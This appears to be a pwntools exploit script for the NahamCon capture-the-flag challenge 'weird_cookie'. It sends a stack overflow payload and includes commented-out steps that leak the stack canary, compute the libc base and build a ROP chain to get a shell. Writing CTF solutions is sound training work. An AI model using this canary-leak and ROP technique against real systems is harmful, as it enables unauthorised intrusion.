#!/usr/bin/python3

from pwn import *

exe = ELF('weird_cookie_patched', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+112

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challenge.nahamcon.com', 31804)
else:
        p = process(exe.path)

GDB()
payload = b"a" * 0x28 + p8(0xb1)
sa(b"me?\n",payload)
# p.recvuntil(b"a" * 0x28)
# canary = u64(p.recv(8))
# info("canary: " + hex(canary))
# printf = canary ^ 0x123456789ABCDEF1
# info("print: " + hex(printf))
# libc.address = printf - libc.sym['printf']
# info("libc base: " + hex(libc.address))
# pop_rdi = libc.address + 0x000000000002164f
# payload = flat(
#         "a" *0x28, canary,
#         pop_rdi, libc.address + 0x10a2fc
# )
# sa(b"again.\n", payload)
p.interactive()
